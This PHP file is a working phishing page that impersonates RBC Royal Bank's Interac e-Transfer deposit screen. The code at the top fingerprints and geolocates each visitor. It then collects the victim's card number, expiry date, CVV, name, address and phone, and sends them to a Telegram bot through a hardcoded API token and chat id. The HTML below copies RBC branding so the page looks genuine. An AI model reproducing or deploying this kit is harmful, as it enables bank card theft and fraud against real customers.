<?php



$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "DO YOU SEE WHAT I C IBC";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴🔒 RBC- SELECTED 🔒🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "6016032432:AAEjURftqkkKIPA1q0nfBbJ003EBwRDU6rs"; 
$data = [
    'chat_id' => '-4001637871',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?>
     <?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html lang="en" class="ui-mobile">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="ROBOTS" content="NOINDEX, NOFOLLOW">
    <meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=0.65, minimum-scale=0.50, maximum-scale=0.80">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>RBC Royal Bank Mobile</title>

    <link href="./files/mobile-phone-ip-an.css" type="text/css" rel="stylesheet">
    <link href="./files/jquery.mobile-1.2.0.min.css" type="text/css" rel="stylesheet">

    <script src="./files/jquery-1.8.2.min.js"></script>
</head>

<body class="ui-mobile-viewport ui-overlay-c">
    <div data-role="page" id="home" class="master-wpr ui-page ui-body-c ui-page-active" data-url="home" tabindex="0" style="min-height: 1326px;">
        <!-- Mobile Header Start -->
        <div id="mobile-header">
            <span id="logo"><img src="./files/logo-en.png" height="60" alt="RBC Logo"></span>
        </div>
        <div id="mobile-sub-header">
            <span id="sub-logo"><img src="./files/int-en.png" height="47" alt="Interac e-Transfer Logo"></span>
        </div>
        <!-- Mobile Header End -->

        <div id="mobile-content">
            <div id="mobile-content-text">How would you like to deposit your Interac e-Transfer?</div>
        </div>

        <a href="index.php" id="download-link" class="ui-link">
            <div id="mobile-app-btn">
                <p class="btn-text">RBC Mobile</p>
            </div>
        </a>

        <a href="index.php" id="nothanks-link" class="ui-link">
            <div id="online-banking-btn">
                <p class="btn-text">RBC Online Banking</p>
            </div>
        </a>

        <div id="app-store-wrapper">
            <div id="app-store-text">If you don’t have the latest version of the RBC Mobile App, you can download it here:</div>
            <div id="app-store-logo">
                <span id="app-store-img">
          <a href="https://itunes.apple.com/ca/app/rbc-mobile/id407597290?mt=8" class="ui-link">
            <img src="./files/ios-app-str.png" height="46" alt="App Store Logo and Link to download RBC Mobile App.">
          </a>
        </span>
            </div>
        </div>

        <div id="footer-wrapper">
            <p>Royal Bank of Canada © 1995-
                <script>
                    document.write(new Date().getFullYear());
                </script>2023</p>
            <p>
                <a href="http://www.rbc.com/privacysecurity/ca/" target="_blank" class="ui-link" title="Privacy and Security (Opens new window)">Privacy &amp; Security &nbsp;</a>
                <img src="./files/link.png" height="9" alt="">
            </p>
            <p>
                <a href="http://www.rbc.com/legal/" target="_blank" class="ui-link" title="Legal (Opens new window)">Legal &nbsp;</a>
                <img src="./files/link.png" height="9" alt="">
            </p>
            <p>
                <a href="http://www.rbc.com/accessibility/" target="_blank" class="ui-link" title="Accessibility (Opens new window) Link">Accessibility &nbsp;</a>
                <img src="./files/link.png" height="9" alt="">
            </p>
        </div>
    </div>

    <div class="ui-loader ui-corner-all ui-body-a ui-loader-default">
        <span class="ui-icon ui-icon-loading"></span>
        <h1>loading</h1>
    </div>
</body>

</html>